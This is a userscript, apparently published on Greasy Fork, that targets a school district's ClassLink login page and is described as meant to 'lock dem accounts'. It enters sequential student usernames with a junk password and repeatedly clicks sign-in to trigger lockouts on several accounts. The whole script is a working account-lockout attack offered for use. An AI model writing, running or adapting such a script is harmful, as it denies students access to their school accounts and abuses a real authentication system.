// ==UserScript==
// @name         acc locka 🤯
// @namespace    http://tampermonkey.net/
// @version      0.02
// @description  lock dem accounts
// @author       iolav
// @match        https://launchpad.classlink.com/ltisd
// @icon         data:image/png;base64,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
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/458807/acc%20locka%20%F0%9F%A4%AF.user.js
// @updateURL https://update.greasyfork.org/scripts/458807/acc%20locka%20%F0%9F%A4%AF.meta.js
// ==/UserScript==

let currentnumber = 111000;
let people = 3;
let peopleused = 0;

function runacc() {
    document.getElementById("username").value = "s"+currentnumber.toString();
    document.getElementById("password").value = "RAHHHHHHHHHHHHHHH";

    var i = 1;
    function myLoop() {
        setTimeout(function() {
            document.getElementById("signin").click();
            i++;
            if (i < 9) {
                myLoop();
            } else {
                if (peopleused < people) {
                    peopleused++
                    currentnumber++
                    runacc();
                }
            }
        }, 1250)
    }

    myLoop();
}

(function() {
    runacc();
})();